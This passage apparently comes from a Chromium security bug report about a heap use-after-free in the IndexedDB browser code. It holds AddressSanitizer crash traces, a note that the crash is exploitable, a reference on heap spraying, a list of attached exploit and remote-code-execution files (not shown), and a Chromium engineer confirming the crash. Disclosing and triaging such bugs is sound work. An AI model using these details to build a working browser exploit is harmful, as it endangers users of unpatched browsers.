    #34 0x7ff8d0f66b88 in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,void,0,1,2,3>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:946
    #35 0x7ff8d0f66b88 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,base::internal::BindState<1,1,0,void (mojo::SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher>,int,unsigned int,mojo::HandleSignalsState>,void()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #36 0x7ff8d0f66b88 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl mojo::SimpleWatcher::*&&)(int, unsigned int, struct mojo::HandleSignalsState const &), class base::WeakPtr<class mojo::SimpleWatcher> &&, int &&, unsigned int &&, struct mojo::HandleSignalsState &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl mojo::SimpleWatcher::*)(int, unsigned int, struct mojo::HandleSignalsState const &), class base::WeakPtr<class mojo::SimpleWatcher>, int, unsigned int, struct mojo::HandleSignalsState>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #37 0x7ff8d0a3c963 in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #38 0x7ff8d0a3c963 in base::TaskAnnotator::RunTaskImpl(struct base::PendingTask &) C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:207:34
    #39 0x7ff8d09917cc in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h:104
    #40 0x7ff8d09917cc in base::internal::TaskTracker::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:686
    #41 0x7ff8d09917cc in base::internal::TaskTracker::RunBlockShutdown(struct base::internal::Task &, class base::TaskTraits const &, class base::internal::TaskSource *, class base::internal::SequenceToken const &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:679:3
    #42 0x7ff8d098fa5e in base::internal::TaskTracker::RunTaskWithShutdownBehavior C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:704
    #43 0x7ff8d098fa5e in base::internal::TaskTracker::RunTask(struct base::internal::Task, class base::internal::TaskSource *, class base::TaskTraitsconst &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:501:5
    #44 0x7ff8d098eb0e in base::internal::TaskTracker::RunAndPopNextTask(class base::internal::RegisteredTaskSource) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:391:5
    #45 0x7ff8d09792d5 in base::internal::WorkerThread::RunWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:473:36
    #46 0x7ff8d097813f in base::internal::WorkerThread::RunPooledWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:359:3
    #47 0x7ff8d0885d13 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:114:13
    #48 0x7ff9dad3beee  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)
    #49 0x7ffa1fffe8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)

previously allocated by thread T10 here:
    #0 0x7ff9dad3c6ff  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005c6ff)
    #1 0x7ff8c88f5279 in std::__Cr::make_unique C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__memory\unique_ptr.h:759
    #2 0x7ff8c88f5279 in content::indexed_db::Database::CreateConnection(class std::__Cr::unique_ptr<class content::indexed_db::DatabaseCallbacks, struct std::__Cr::default_delete<class content::indexed_db::DatabaseCallbacks>>, class mojo::Remote<class storage::mojom::IndexedDBClientStateChecker>, class base::UnguessableToken, int) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\database.cc:1097:21
    #3 0x7ff8c88d0734 in content::indexed_db::ConnectionCoordinator::OpenRequest::StartUpgrade(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:337:24
    #4 0x7ff8c88d123a in base::internal::DecayedFunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #5 0x7ff8c88d123a in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:946
    #6 0x7ff8c88d123a in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::ConnectionCoordinator::OpenRequest::*)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #7 0x7ff8c88d123a in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(void), class base::WeakPtr<class content::indexed_db::ConnectionCoordinator::OpenRequest> &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl content::indexed_db::ConnectionCoordinator::OpenRequest::*)(void), class base::WeakPtr<class content::indexed_db::ConnectionCoordinator::OpenRequest>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #8 0x7ff8c88c954e in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #9 0x7ff8c88c954e in content::indexed_db::ConnectionCoordinator::ConnectionRequest::ContinueAfterAcquiringLocks(class base::OnceCallback<(void)>) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:125:28
    #10 0x7ff8c88c7e7b in content::indexed_db::ConnectionCoordinator::OpenRequest::OnNoConnections(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:325:5
    #11 0x7ff8c88cabc9 in content::indexed_db::ConnectionCoordinator::OpenRequest::ContinueOpening(bool) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:287:7
    #12 0x7ff8c88c9c30 in content::indexed_db::ConnectionCoordinator::OpenRequest::InitDatabase(bool) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:227:5
    #13 0x7ff8c88cffe4 in base::internal::DecayedFunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&,bool &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #14 0x7ff8c88cffe4 in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&,bool &&>,void,0,1>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:946
    #15 0x7ff8c88cffe4 in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest> &&,bool &&>,base::internal::BindState<1,1,0,void (content::indexed_db::ConnectionCoordinator::OpenRequest::*)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::OpenRequest>,bool>,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #16 0x7ff8c88cffe4 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl content::indexed_db::ConnectionCoordinator::OpenRequest::*&&)(bool), class base::WeakPtr<class content::indexed_db::ConnectionCoordinator::OpenRequest> &&, bool &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl content::indexed_db::ConnectionCoordinator::OpenRequest::*)(bool), class base::WeakPtr<class content::indexed_db::ConnectionCoordinator::OpenRequest>, bool>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #17 0x7ff8c8a4472b in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #18 0x7ff8c8a4472b in content::indexed_db::PartitionedLockManager::MaybeGrantLocksAndIterate(class std::__Cr::__list_iterator<struct content::indexed_db::PartitionedLockManager::AcquisitionRequest, void *>, bool) C:\b\s\w\ir\cache\builder\src\components\services\storage\indexed_db\locks\partitioned_lock_manager.cc:159:54
    #19 0x7ff8c8a431a7 in content::indexed_db::PartitionedLockManager::AcquireLocks(class base::internal::flat_tree<struct content::indexed_db::PartitionedLockManager::PartitionedLockRequest, struct std::__Cr::identity, struct std::__Cr::less<void>, class std::__Cr::vector<struct content::indexed_db::PartitionedLockManager::PartitionedLockRequest, class std::__Cr::allocator<struct content::indexed_db::PartitionedLockManager::PartitionedLockRequest>>>, struct content::indexed_db::PartitionedLockHolder &, class base::OnceCallback<(void)>, class base::RepeatingCallback<(struct content::indexed_db::PartitionedLockHolder const &)>) C:\b\s\w\ir\cache\builder\src\components\services\storage\indexed_db\locks\partitioned_lock_manager.cc:104:3
    #20 0x7ff8c88c9851 in content::indexed_db::ConnectionCoordinator::ConnectionRequest::ContinueAfterAcquiringLocks(class base::OnceCallback<(void)>)C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:135:25
    #21 0x7ff8c88c75cf in content::indexed_db::ConnectionCoordinator::OpenRequest::Perform(bool) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:200:7
    #22 0x7ff8c88c4a02 in content::indexed_db::ConnectionCoordinator::ExecuteTask(bool) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection_coordinator.cc:671:14
    #23 0x7ff8c88e7b90 in content::indexed_db::Database::RunTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\database.cc:325:33
    #24 0x7ff8c8890bc9 in content::indexed_db::BucketContext::RunTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\bucket_context.cc:484:24
    #25 0x7ff8c88a42bf in base::internal::DecayedFunctorTraits<void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #26 0x7ff8c88a42bf in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:946
    #27 0x7ff8c88a42bf in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #28 0x7ff8c88a42bf in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl content::indexed_db::BucketContext::*&&)(void), class base::WeakPtr<class content::indexed_db::BucketContext> &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl content::indexed_db::BucketContext::*)(void), class base::WeakPtr<class content::indexed_db::BucketContext>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #29 0x7ff8d0a3c963 in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #30 0x7ff8d0a3c963 in base::TaskAnnotator::RunTaskImpl(struct base::PendingTask &) C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:207:34
    #31 0x7ff8d09917cc in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h:104
    #32 0x7ff8d09917cc in base::internal::TaskTracker::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:686
    #33 0x7ff8d09917cc in base::internal::TaskTracker::RunBlockShutdown(struct base::internal::Task &, class base::TaskTraits const &, class base::internal::TaskSource *, class base::internal::SequenceToken const &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:679:3
    #34 0x7ff8d098fa5e in base::internal::TaskTracker::RunTaskWithShutdownBehavior C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:704
    #35 0x7ff8d098fa5e in base::internal::TaskTracker::RunTask(struct base::internal::Task, class base::internal::TaskSource *, class base::TaskTraitsconst &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:501:5
    #36 0x7ff8d098eb0e in base::internal::TaskTracker::RunAndPopNextTask(class base::internal::RegisteredTaskSource) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:391:5
    #37 0x7ff8d09792d5 in base::internal::WorkerThread::RunWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:473:36
    #38 0x7ff8d097813f in base::internal::WorkerThread::RunPooledWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:359:3
    #39 0x7ff8d0885d13 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:114:13
    #40 0x7ff9dad3beee  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)
    #41 0x7ffa1fffe8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #42 0x7ffa21388d9b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

Thread T10 created by T8 here:
    #0 0x7ff9dad3be04  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005be04)
    #1 0x7ff8d088503c in base::`anonymous namespace'::CreateThreadInternal C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:182:7
    #2 0x7ff8d097677f in base::internal::WorkerThread::Start(class scoped_refptr<class base::SingleThreadTaskRunner>, class base::WorkerThreadObserver*) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:185:3
    #3 0x7ff8d0987377 in base::internal::ThreadGroup::BaseScopedCommandsExecutor::Flush(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group.cc:89:13
    #4 0x7ff8d098704d in base::internal::ThreadGroup::BaseScopedCommandsExecutor::~BaseScopedCommandsExecutor(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group.cc:80:3
    #5 0x7ff8d097df82 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::~ScopedCommandsExecutor C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group_impl.cc:43
    #6 0x7ff8d097df82 in base::internal::ThreadGroupImpl::WorkerDelegate::GetWork(class base::internal::WorkerThread *) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group_impl.cc:465:1
    #7 0x7ff8d0979108 in base::internal::WorkerThread::RunWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:460:52
    #8 0x7ff8d097813f in base::internal::WorkerThread::RunPooledWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:359:3
    #9 0x7ff8d0885d13 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:114:13
    #10 0x7ff9dad3beee  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)
    #11 0x7ffa1fffe8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #12 0x7ffa21388d9b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

Thread T8 created by T0 here:
    #0 0x7ff9dad3be04  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005be04)
    #1 0x7ff8d088503c in base::`anonymous namespace'::CreateThreadInternal C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:182:7
    #2 0x7ff8d097677f in base::internal::WorkerThread::Start(class scoped_refptr<class base::SingleThreadTaskRunner>, class base::WorkerThreadObserver*) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:185:3
    #3 0x7ff8d0987377 in base::internal::ThreadGroup::BaseScopedCommandsExecutor::Flush(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group.cc:89:13
    #4 0x7ff8d098704d in base::internal::ThreadGroup::BaseScopedCommandsExecutor::~BaseScopedCommandsExecutor(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group.cc:80:3
    #5 0x7ff8d097bb77 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::~ScopedCommandsExecutor C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group_impl.cc:43
    #6 0x7ff8d097bb77 in base::internal::ThreadGroupImpl::Start(unsigned __int64, unsigned __int64, class base::TimeDelta, class scoped_refptr<class base::SingleThreadTaskRunner>, class base::WorkerThreadObserver *, enum base::internal::ThreadGroup::WorkerEnvironment, bool, class std::__Cr::optional<class base::TimeDelta>) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_group_impl.cc:252:3
    #7 0x7ff8d096ce05 in base::internal::ThreadPoolImpl::Start(struct base::ThreadPoolInstance::InitParams const &, class base::WorkerThreadObserver *) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\thread_pool_impl.cc:198:35
    #8 0x7ff8c8192d61 in content::StartBrowserThreadPool(void) C:\b\s\w\ir\cache\builder\src\content\browser\startup_helper.cc:98:36
    #9 0x7ff8cca9af25 in content::ContentMainRunnerImpl::RunBrowser(struct content::MainFunctionParams, bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1225:5
    #10 0x7ff8cca9a14e in content::ContentMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1127:12
    #11 0x7ff8cca8e61f in content::RunContentProcess(struct content::ContentMainParams, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:346:36
    #12 0x7ff8cca8eb8e in content::ContentMain(struct content::ContentMainParams) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:359:10
    #13 0x7ff8bd6d300f in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:228:12
    #14 0x7ff6cf4c479b in MainDllLoader::Launch(struct HINSTANCE__*, class base::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:201:12
    #15 0x7ff6cf4c200c in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:352:20
    #16 0x7ff6cf995aff in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #17 0x7ff6cf995aff in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #18 0x7ffa1fffe8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #19 0x7ffa21388d9b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:886 in std::__Cr::__tree<std::__Cr::__value_type<long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > >,std::__Cr::__map_value_compare<long long,std::__Cr::pair<const long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > >,std::__Cr::less<long long>,1>,std::__Cr::allocator<std::__Cr::pair<const long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > > > >::begin
Shadow bytes around the buggy address:
  0x1219128a1d80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1219128a1e00: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x1219128a1e80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1219128a1f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1219128a1f80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
=>0x1219128a2000: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x1219128a2080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1219128a2100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
  0x1219128a2180: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x1219128a2200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1219128a2280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==21320==ADDITIONAL INFO

==21320==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7ff8c88965ed in content::indexed_db::BucketContext::QueueRunTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\bucket_context.cc:475:7
    #1 0x7ff8d0f64a98 in mojo::SimpleWatcher::ArmOrNotify(void) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:238:28
    #2 0x7ff8c88297de in content::indexed_db::IndexedDBContextImpl::BindIndexedDBImpl(struct storage::BucketClientInfo const &, class mojo::PendingRemote<class storage::mojom::IndexedDBClientStateChecker>, class mojo::PendingReceiver<class blink::mojom::IDBFactory>, class base::expected<struct storage::BucketInfo, struct storage::DetailedQuotaError>) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\indexed_db_context_impl.cc:359:18
    #3 0x7ff8d68c3e88 in storage::QuotaManagerProxy::UpdateOrCreateBucket(struct storage::BucketInitParams const &, class scoped_refptr<class base::SequencedTaskRunner>, class base::OnceCallback<(class base::expected<struct storage::BucketInfo, struct storage::DetailedQuotaError>)>) C:\b\s\w\ir\cache\builder\src\storage\browser\quota\quota_manager_proxy.cc:131:7


Command line: `chrome --incognito --flag-switches-begin --flag-switches-end --file-url-path-alias="/gen=I:\Chromium\chromium-142.0.7405.4-win64-asan\gen"`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==21320==END OF ADDITIONAL INFO
==21320==ABORTING

```
# **REFERENCES**

[Project Zero blog - heap spraying to predictable addresses](https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html)  

[music in the video (lol)](https://www.youtube.com/watch?v=ZQlvY5UfjeE)

# **CREDIT INFORMATION**

Reporter credit: 0xSombra

## Attachments

- [exploit.patch](attachments/exploit.patch) (text/x-diff, 4.4 KB)
- [renderer.patch](attachments/renderer.patch) (text/x-diff, 796 B)
- [index.html](attachments/index.html) (text/html, 451 B)
- [main.js](attachments/main.js) (text/javascript, 10.1 KB)
- [video.mp4](attachments/video.mp4) (video/mp4, 34.9 MB)
- [uaf-database-runtasks.textproto](attachments/uaf-database-runtasks.textproto) (application/octet-stream, 1.1 KB)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- [renderer.patch](attachments/renderer.patch) (text/x-diff, 796 B)
- [v8.patch](attachments/v8.patch) (text/x-diff, 6.3 KB)
- [exploit.zip](attachments/exploit.zip) (application/zip, 14.5 KB)
- [copy_mojo_js_bindings.py](attachments/copy_mojo_js_bindings.py) (text/x-python, 697 B)
- [disable_aslr.py](attachments/disable_aslr.py) (text/x-python, 1.2 KB)
- [rce_64bit_NoASLR.mp4](attachments/rce_64bit_NoASLR.mp4) (video/mp4, 2.6 MB)
- [rce_32bit.mp4](attachments/rce_32bit.mp4) (video/mp4, 10.4 MB)
- [renderer.patch](attachments/renderer.patch) (text/x-diff, 1.6 KB)
- [main32.js](attachments/main32.js) (text/javascript, 21.7 KB)
- [pe.js](attachments/pe.js) (text/javascript, 12.0 KB)
- [rce_32bit_reliable.mp4](attachments/rce_32bit_reliable.mp4) (video/mp4, 17.5 MB)

## Timeline

### wf...@chromium.org (2025-09-23)

Thanks for your report and your comprehensive analysis.

### wf...@chromium.org (2025-09-23)

Nice find! I can confirm I am able to reproduce this crash locally with only the `renderer.patch` patch.

```
=================================================================
==63236==ERROR: AddressSanitizer: heap-use-after-free on address 0x125b1c73d340 at pc 0x12b12a332146 bp 0x0099d61fefe0 sp 0x0099d61ff028
READ of size 8 at 0x125b1c73d340 thread T8
    #0 0x12b12a332145 in content::indexed_db::Database::RunTasks c:\src\chromium\src\content\browser\indexed_db\instance\database.cc:343
    #1 0x12b12a2cda99 in content::indexed_db::BucketContext::RunTasks c:\src\chromium\src\content\browser\indexed_db\instance\bucket_context.cc:446
    #2 0x12b12a2e3f9f in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> >,void ()>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #3 0x12b11c907e54 in base::OnceCallback<void ()>::Run c:\src\chromium\src\base\functional\callback.h:155
    #4 0x12b133e58e9c in base::TaskAnnotator::RunTaskImpl c:\src\chromium\src\base\task\common\task_annotator.cc:207
    #5 0x12b133d4f2cc in base::internal::TaskTracker::RunBlockShutdown c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:679
    #6 0x12b133d4d16a in base::internal::TaskTracker::RunTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:501
    #7 0x12b133d4bd4e in base::internal::TaskTracker::RunAndPopNextTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:391
    #8 0x12b133d2a04d in base::internal::WorkerThread::RunWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:473
    #9 0x12b133d28ddf in base::internal::WorkerThread::RunPooledWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:359
    #10 0x12b133bfa6d1 in base::`anonymous namespace'::ThreadFunc c:\src\chromium\src\base\threading\platform_thread_win.cc:114
    #11 0x7ffaa683beee in _asan_wrap_CreateThread+0x14e (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)
    #12 0x7ffb5956e8d6 in BaseThreadInitThunk+0x16 (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #13 0x7ffb597e8d9b in RtlUserThreadStart+0x2b (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

0x125b1c73d340 is located 64 bytes inside of 456-byte region [0x125b1c73d300,0x125b1c73d4c8)
freed by thread T8 here:
    #0 0x7ffaa683d2c6 in operator delete+0x96 (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005d2c6)
    #1 0x12b12a2fb210 in content::indexed_db::Connection::~Connection c:\src\chromium\src\content\browser\indexed_db\instance\connection.cc:104
    #2 0x12b1299c4b99 in mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::LockHandle>::Close c:\src\chromium\src\mojo\public\cpp\bindings\self_owned_associated_receiver.h:72
